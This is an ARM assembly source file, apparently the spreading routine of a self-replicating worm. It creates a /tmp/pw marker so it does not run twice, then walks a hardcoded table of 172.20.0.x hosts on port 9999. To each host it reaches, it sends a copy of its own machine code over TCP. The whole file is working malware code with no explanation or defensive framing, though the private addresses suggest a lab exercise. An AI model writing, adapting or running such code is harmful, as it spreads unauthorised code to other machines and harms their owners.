	.text
	.globl _start
_start:
	# Create /tmp/pw
	mov r7, $5      @ SYS_OPEN
	adr r0, mark    @ Use PC-Relative Addressing
	mov r1, $0300   @ 0100 | 0200
	mov r2, $0700
	svc $0          @ open ("/tmp/pw", O_CREAT | O_EXCL, S_IRWXU) ;
	
	cmp r0, $0
	ble done
	mov r7, $6      @ SYS_CLOSE
	svc $0
	
	# Loop over ip_table
	adr r8, ip_table
scan:
	# Create Socket
	mov r7, $281  @ socket
	mov r0, $2    @ AF_INET = 2
	mov r1, $1    @ SOCK_STREAM = 1
	mov r2, $6    @ IPPROTO_TCP = 6
	svc $0        @ s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov r9, r0
	
	# Connect to server
	mov r7, $283
	mov r1, r8	  @ Get current ip_table Entry
	mov r2, $16
	svc $0
	
	cmp r0, $0
	bne next     @ NOt connected.... try next server
	
	# Here we had successfully connected... Just move code
	mov r7, $4       @ SYS_WRITE (r0 is already the socket
	mov r0, r9
	adr r1, _start
	mov r2, #code_size
	svc $0
	
next:
	mov r0, r9
	mov r7, $6    
	svc $0
	
	ldr r3, [r8],$8   @ Get next target and update r8 to point to next one
	cmp r3, $0        @ If IP is zero... end
	beq done
	b scan
	

done:	
	# Exit
	mov r7, $1      @exit
	svc #0
	
# Data starts here. It is included in .text segment
mark:	.asciz "/tmp/pw"
ip_table:
	.quad 0x560014ac0f270002 
	.quad 0x4b0014ac0f270002
	.quad 0x190014ac0f270002
	.quad 0x2f0014ac0f270002
	.quad 0x6b0014ac0f270002
	.quad 0x170014ac0f270002
	.quad 0x00
end_code:	.equ	code_size, end_code - _start	

